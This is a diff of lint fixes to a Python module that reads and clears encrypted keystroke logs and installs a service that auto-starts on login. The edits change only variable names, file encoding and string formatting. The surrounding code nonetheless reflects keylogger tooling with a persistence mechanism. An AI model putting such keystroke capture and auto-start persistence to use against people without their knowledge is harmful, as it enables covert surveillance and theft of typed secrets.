@@ -320,7 +320,7 @@ def read_keylogs(max_lines: int = 500, tail: bool = True) -> List[str]:
             data = f.read()
         decrypted = decrypt_data(data).decode('utf-8', errors='replace')
         lines = decrypted.splitlines()
-        lines = [l for l in lines if l.strip()]
+        lines = [line for line in lines if line.strip()]
         if tail and len(lines) > max_lines:
             lines = lines[-max_lines:]
         return lines
@@ -339,7 +339,7 @@ def clear_keylogs() -> Dict[str, Any]:
         if was_running:
             stop_daemon()
 
-        with open(str(KEYLOGS_FILE), "w") as f:
+        with open(str(KEYLOGS_FILE), "w", encoding="utf-8") as f:
             f.truncate(0)
 
         if was_running:
@@ -394,7 +394,7 @@ WantedBy=default.target
 
         return {
             "success": True,
-            "message": f"Service installed and enabled. It will auto-start on login.",
+            "message": "Service installed and enabled. It will auto-start on login.",
         }
     except Exception as e:
         return {"success": False, "message": f"Failed to install service: {e}", "error": str(e)}
